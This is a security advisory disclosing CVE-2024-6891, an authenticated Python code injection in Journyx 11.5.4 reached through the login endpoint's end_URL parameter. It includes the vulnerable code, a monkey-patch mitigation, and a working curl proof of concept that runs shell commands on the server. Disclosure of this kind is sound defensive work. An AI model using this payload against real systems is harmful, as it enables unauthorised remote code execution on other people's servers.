KL-001-2024-008: Journyx Authenticated Remote Code Execution
Title: Journyx Authenticated Remote Code Execution
Advisory ID: KL-001-2024-008
Publication Date: 2024.08.07
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-008.txt
1. Vulnerability Details
Affected Vendor: Journyx
Affected Product: Journyx (jtime)
Affected Version: 11.5.4
Platform: GNU/Linux
CWE Classification: CWE-94: Improper Control of Generation of Code
('Code Injection'), CWE-95: Improper Neutralization
of Directives in Dynamically Evaluated Code
('Eval Injection')
CVE ID: CVE-2024-6891
2. Vulnerability Description
Attackers with a valid username and password can exploit
a python code injection vulnerability during the natural
login flow.
3. Technical Description
When utilizing a username and password to authenticate to
Journyx via the web interface, an HTTP request is sent to
"wtlogin.pyc" containing the credentials. Upon a successful
login, the user is redirected to "wte.pyc" or the URL specified
in the "end\_URL" body parameter if one is supplied.
An additional condition is present, however. If the
"end\_URL" value is over 1,000 characters, the value is instead
interpolated into a python "import" statement which is passed
into the "exec()" function, thereby executing arbitrary code.
Code snippet from "wtlogin.pyc":
finalURL = end\_URL + '.pyc?' + genlib.URLEncodeParams(params)
if len(finalURL) < 1000:
raise genlib.HTTP302Found(finalURL)
else:
exec('import %s; %s.main()' % (end\_URL, end\_URL))
The "params" variable is derived from the query parameters
included in the login request, so the size of "finalURL"
is trivial to inflate.
4. Mitigation and Remediation Recommendation
The vendor reports that this issue was remediated in Journyx
v12.0.0, which is the first wholly cloud-hosted version of
this product.
For self-hosted instances of JournyX, additional security
measures (such as input sanitization) can be added by monkey
patching the PYC file responsible for handling request
parameters (mycgi.pyc).
1) Rename "mycgi.pyc" to an alternative name, e.g. mycgi\_original.pyc.
$ mv wt\_tar/pi/pylib/wtlib/mycgi.py wt\_tar/pi/pylib/wtlib/mycgi\_original.py
2) Create a file named "mycgi.py" in the same directory.
$ touch wt\_tar/pi/pylib/wtlib/mycgi.py
3) Insert the following code into the newly created "mycgi.py"
from mycgi\_original import \*
from html import escape
def patch():
pdata = \_parse()
# force the value of "end\_URL" to always be "wte"
if pdata.get('end\_URL'): pdata['end\_URL'] = ['wte']
# sanitize user-controlled error messages
for parameter in ['error', 'error\_description']:
if not pdata.get(parameter): continue
pdata[parameter] = [escape(value) for value in pdata[parameter]]
return pdata
\_parse = parse
parse = patch
Once these changes have been made, the JournyX native "mycgi.parse()"
function will be overwritten with the "patch()" function located in the
"mycgi.py" file. Relevant to this advisory, the patch provided above
will force the "end\_URL" parameter to always have a value of "wte".

7. Proof of Concept
By leveraging the existing "web" python module, it is possible
to see the output of shell commands as returned by "os.popen()".
[attacker@box]$ HOST='redacted.com'; PORT='8080'; USERNAME='employee'; PASSWORD='password123'; COMMAND='id'; \
curl -x http://localhost:8080 -X POST \
-d "wtusername=$USERNAME&wtpassword=$PASSWORD&end\_URL=os,web%0aweb.response.text%3dos.popen('$COMMAND').read()#&timestamp=9999999999&pageid=$RANDOM" \
-H 'Cookie: wtsession=foobar' \
"http://$HOST:$PORT/jtcgi/wtlogin.pyc?z=$(printf 'Z%.0s' {1..1000})"
